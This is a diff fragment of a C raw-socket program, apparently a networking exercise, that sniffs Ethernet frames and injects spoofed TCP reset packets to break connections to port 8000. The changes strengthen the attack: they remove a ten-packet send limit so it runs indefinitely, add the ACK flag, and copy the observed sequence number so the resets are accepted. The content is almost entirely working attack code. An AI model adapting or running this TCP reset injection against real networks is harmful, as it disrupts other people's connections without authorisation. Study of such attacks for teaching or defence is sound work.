@@ -119,8 +119,8 @@ int main(int argc, char *argv[]){
 	socket_address.sll_ifindex = if_idx.ifr_ifindex;
 	socket_address.sll_halen = ETH_ALEN;
 
-	 while ((size = read(fd, buffer_in, BUFFER_SIZE)) > 0 && num_envios < 10){
-//	while ((size = read(fd, buffer_in, BUFFER_SIZE)) > 0){
+//	 while ((size = read(fd, buffer_in, BUFFER_SIZE)) > 0 && num_envios < 10){
+	while ((size = read(fd, buffer_in, BUFFER_SIZE)) > 0){
 
 		// if(buffer_in[12] == 0x08 && buffer_in[13] == 0x00) {
 		// 	for(i=6;i<12;i++) {
@@ -172,17 +172,17 @@ int main(int argc, char *argv[]){
 				if( port_dst == 0x1f40 ) {
 					eh->ether_dhost[0] = mac_dst[0];
 					eh->ether_dhost[1] = mac_dst[1];
-			    eh->ether_dhost[2] = mac_dst[2];
-			    eh->ether_dhost[3] = mac_dst[3];
-			    eh->ether_dhost[4] = mac_dst[4];
-			    eh->ether_dhost[5] = mac_dst[5];
-					socket_address.sll_addr[0] = mac_dst[0];
-			    socket_address.sll_addr[1] = mac_dst[1];
-			    socket_address.sll_addr[2] = mac_dst[2];
-			    socket_address.sll_addr[3] = mac_dst[3];
-			    socket_address.sll_addr[4] = mac_dst[4];
-			    socket_address.sll_addr[5] = mac_dst[5];
-          frame_len += sizeof(struct ether_header);
+			        eh->ether_dhost[2] = mac_dst[2];
+    			    eh->ether_dhost[3] = mac_dst[3];
+	    		    eh->ether_dhost[4] = mac_dst[4];
+	    		    eh->ether_dhost[5] = mac_dst[5];
+	   				socket_address.sll_addr[0] = mac_dst[0];
+		    	    socket_address.sll_addr[1] = mac_dst[1];
+		    	    socket_address.sll_addr[2] = mac_dst[2];
+		    	    socket_address.sll_addr[3] = mac_dst[3];
+		    	    socket_address.sll_addr[4] = mac_dst[4];
+		    	    socket_address.sll_addr[5] = mac_dst[5];
+                    frame_len += sizeof(struct ether_header);
 
 					packet_size = (sizeof(struct ip) + sizeof(struct tcphdr));
 					iphdr->ip_v = 4;
@@ -192,23 +192,22 @@ int main(int argc, char *argv[]){
 					iphdr->ip_ttl = IPDEFTTL;
 					iphdr->ip_p = IPPROTO_TCP;
 
-					// iphdr->ip_src.s_addr = ip_src[3]<<24 | ip_src[2]<<16 | ip_src[1]<<8 | ip_src[0];
-					// iphdr->ip_dst.s_addr = ip_dst[3]<<24 | ip_dst[2]<<16 | ip_dst[1]<<8 | ip_dst[0];
 					iphdr->ip_src.s_addr = ip_src[3]<<24 | ip_src[2]<<16 | ip_src[1]<<8 | ip_src[0];
 					iphdr->ip_dst.s_addr = ip_dst[3]<<24 | ip_dst[2]<<16 | ip_dst[1]<<8 | ip_dst[0];
 					iphdr->ip_sum = (unsigned short)in_cksum((unsigned short *)iphdr, sizeof(struct ip));
 					frame_len += sizeof(struct ip);
 
-        	tcp->th_dport = htons(port_src);
-	        tcp->th_sport = htons(port_server);
-	        tcp->th_seq = htonl(ack);
-					tcp->th_ack = 0;
-          tcp->th_off = 5;
+        	        tcp->th_dport = htons(port_src);
+	                tcp->th_sport = htons(port_server);
+	                tcp->th_seq = htonl(ack);
+					//tcp->th_ack = 0;
+                    tcp->th_ack = htonl(seq);
+                    tcp->th_off = 5;
 					// tcp->th_flags = TH_ACK | TH_RST;
-					tcp->th_flags = TH_RST | TH_PUSH;
+					tcp->th_flags = TH_RST | TH_PUSH | TH_ACK;
 					// tcp->th_flags = TH_RST;
-	        tcp->th_win = htons(1200);
-	       	tcp->th_sum = trans_check(IPPROTO_TCP, packet, sizeof(struct tcphdr), iphdr->ip_src, iphdr->ip_dst);
+        	        tcp->th_win = htons(1200);
+	               	tcp->th_sum = trans_check(IPPROTO_TCP, packet, sizeof(struct tcphdr), iphdr->ip_src, iphdr->ip_dst);
 					frame_len += sizeof(struct tcphdr);
 
 
@@ -224,13 +223,19 @@ int main(int argc, char *argv[]){
 						printf("Pacote de TCP reset enviado.\n");
 						// memset(packet,0,BUFFER_SIZE);
 						// memset(buffer_in,0,BUFFER_SIZE);
-						port_src = 0;
-						port_dst = 0;
-						ack = 0;
-						seq = 0;
-            frame_len = 0;
+						//port_src = 0;
+						//port_dst = 0;
+						//ack = 0;
+						//seq = 0;
+                        //frame_len = 0;
 						num_envios++;
 					}
+                        port_src = 0;
+    					port_dst = 0;
+						ack = 0;
+						seq = 0;
+                        frame_len = 0;
+
 			}
 		}
 		}
